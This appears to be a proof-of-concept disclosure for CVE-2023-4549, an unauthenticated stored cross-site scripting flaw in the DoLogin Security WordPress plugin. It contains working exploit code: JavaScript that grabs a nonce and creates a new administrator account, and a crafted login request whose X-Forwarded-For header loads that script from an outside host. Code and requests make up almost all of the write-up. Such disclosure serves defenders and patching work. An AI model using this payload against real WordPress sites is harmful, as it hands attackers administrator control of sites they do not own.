**CVE ID**: CVE-2023-4549

**Vulnerability Type**: Cross-Site Scripting

**Description**: The DoLogin Security plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'X-Forwarded-For' header in versions up to, and including, 3.6 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
**Steps to reproduce**:

```
1. Put javascript payload on html.cafe.

const url = 'https://s…t/wp-admin/user-new.php';

fetch(url)
  .then(response => response.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const nonceValue = doc.getElementById('_wpnonce_create-user').value;
    const requestOptions = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `action=createuser&_wpnonce_create-user=${encodeURIComponent(
        nonceValue
      )}&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=administrator&email=a@a.com&first_name=&last_name=&url=&pass1=O%21k6c5%5EfjO%5E1sF%26%24%21%26V2PG9e&pass2=O%21k6c5%5EfjO%5E1sF%26%24%21%26V2PG9e&send_user_notification=0&role=administrator&ure_other_roles=&createuser=Add+New+User`
    };

    return fetch(url, requestOptions);
  });


2. Send HTTP login request with specially crafted X-Forwarded-For header.

POST /wp-login.php HTTP/2
Host: <host>
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Content-Length: 106
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://<host>
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>/wp-login.php
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
X-Forwarded-For: <script src=https://html.cafe/x...3></script>

log=XSSor&pwd=abcd&wp-submit=Log+In&redirect_to=https%3A%2F%2F<host>%2Fwp-admin%2F&testcookie=1 
```

**Reference**: 
1. https://wpscan.com/vulnerability/8aebead0-0eab-4d4e-8ceb-8fea0760374f
2. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4549
3. https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/dologin/dologin-security-36-unauthenticated-stored-cross-site-scripting
